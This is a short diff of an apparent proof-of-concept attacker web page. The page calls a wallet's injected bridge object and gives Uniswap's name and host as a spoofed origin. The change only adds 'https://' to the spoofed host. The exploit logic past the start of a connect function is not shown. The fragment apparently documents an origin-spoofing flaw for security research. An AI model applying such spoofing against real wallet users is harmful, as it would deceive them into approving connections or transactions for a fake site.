@@ -8,7 +8,7 @@
 <script>
 // Attacker page served from this (real) origin, but every _tw_ call claims to be Uniswap.
 var SPOOF_NAME = "Uniswap";
-var SPOOF_HOST = "app.uniswap.org";
+var SPOOF_HOST = "https://app.uniswap.org";
 function L(m){var e=document.getElementById('log');e.innerText+=("\n"+m);}
 function bridge(){return window._tw_;}
 function doConnect(){
